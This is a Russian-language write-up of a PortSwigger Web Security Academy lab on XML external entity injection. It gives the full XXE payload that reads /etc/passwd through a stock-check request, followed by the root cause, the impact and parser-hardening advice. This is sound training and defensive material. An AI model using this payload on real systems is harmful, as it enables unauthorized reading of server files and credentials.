# Lab: Exploiting XXE using external entities to retrieve files

**Тема:** XML External Entity (XXE) Injection
**Платформа:** PortSwigger Web Security Academy
**Уровень:** Apprentice
**Дата:** 16.11.2026

## Цель
Использовать уязвимость XXE в функции проверки наличия товара (Check stock) для чтения системного файла /etc/passwd.

## Разведка
1. Перехвачен запрос POST /product/stock в Burp Repeater.
2. Тело запроса содержит XML: ...<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>.

## Эксплуатация
1. В тело запроса добавлено объявление внешней сущности (DOCTYPE) перед элементом stockCheck:
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
2. Значение productId заменено на ссылку на сущность: &xxe;.
3. Итоговый payload:
   <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
4. Отправлен запрос. В ответе сервер вернул ошибку Invalid product ID:, за которой следовало содержимое файла /etc/passwd (список пользователей системы). Лаборатория решена.

## Корневая причина
XML-парсер сервера настроен небезопасно и разрешает обработку внешних сущностей (External Entities). Это позволяет злоумышленнику заставить сервер прочитать локальный файл или выполнить запрос к внутреннему ресурсу.

## Импакт
- **Чтение локальных файлов (LFI):** доступ к конфигурационным файлам, приватным ключам SSH, файлам с паролями баз данных.
- **SSRF (Server-Side Request Forgery):** сканирование внутренней сети через внешние сущности.
- **Отказ в обслуживании (DoS):** использование "Billion Laughs Attack" (XML-бомба).

## Рекомендации
- Отключить поддержку внешних сущностей (DTD) в XML-парсере на уровне кода/конфигурации.
- Использовать безопасные библиотеки для парсинга XML (например, в Java: XMLConstants.FEATURE_SECURE_PROCESSING, disallow-doctype-decl).
- Валидировать и фильтровать входные данные на предмет XML-разметки, если сервис ожидает простые JSON или строки.
